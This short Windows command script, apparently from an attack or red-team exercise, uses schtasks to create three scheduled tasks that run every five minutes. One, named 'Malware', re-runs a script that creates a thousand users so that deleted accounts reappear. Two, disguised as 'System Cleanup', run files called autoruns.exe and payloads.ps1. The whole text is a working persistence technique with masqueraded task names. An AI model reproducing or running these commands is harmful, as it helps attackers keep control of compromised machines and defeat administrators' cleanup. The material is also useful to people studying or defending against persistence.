# Run our create thousand users script every 5 minutes. If the users get deleted, then they will be re-created every 5 minutes with this scheduled task 

schtasks /create /sc minute /mo 5 /tn "Malware" /tr C:\Users\Administrator\AppData\Local\CreateThousandUsers.ps1
schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\autoruns.exe
schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\payloads.ps1
